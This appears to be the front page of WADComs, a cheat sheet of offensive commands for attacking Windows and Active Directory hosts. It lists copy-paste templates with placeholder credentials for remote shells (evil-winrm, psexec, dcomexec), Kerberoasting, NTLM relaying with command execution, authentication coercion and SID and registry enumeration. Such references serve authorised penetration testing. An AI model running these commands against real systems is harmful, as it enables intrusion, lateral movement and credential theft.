WADComs
Star

WADComs is an interactive cheat sheet, containing a curated list of Unix/Windows offensive tools and their respective commands.

If you hate constantly looking up the right command to use against a Windows or Active Directory enfironment (like me), this project should help ease the pain a bit. Just select what information you currently have related to the Windows machine (passwords, usernames, services, etc.), and it will display a list of tools you can try against the machine, along with a template command for easy copy/pasting. See the full list of filters.

This project was inspired by GTFOBins and LOLBAS.

Iâ€™m hoping to make WADComs a collaborative project, so please feel free to contribute your commands.

Command
python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1

  • Username
  • Password
  • RPC
evil-winrm -i 10.10.10.1 -u john -p password123

  • Username
  • Password
  • WMI
python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1

  • Username
  • Password
  • DCOM
python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request

  • Username
  • Password
  • Kerberos
python3 lookupsid.py test.local/john:password123@10.10.10.1

  • Username
  • Password
  • RPC
python3 mimikatz.py test.local/john:password123@10.10.10.1

  • Username
  • Password
  • Kerberos
python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug

  • No Creds
python3 psexec.py test.local/john:password123@10.10.10.1

  • Username
  • Password
  • SMB
python3 rpcdump.py test.local/john:password123@10.10.10.1

  • Username
  • Password
  • RPC
python3 reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s

  • Username
  • Password
  • SMB
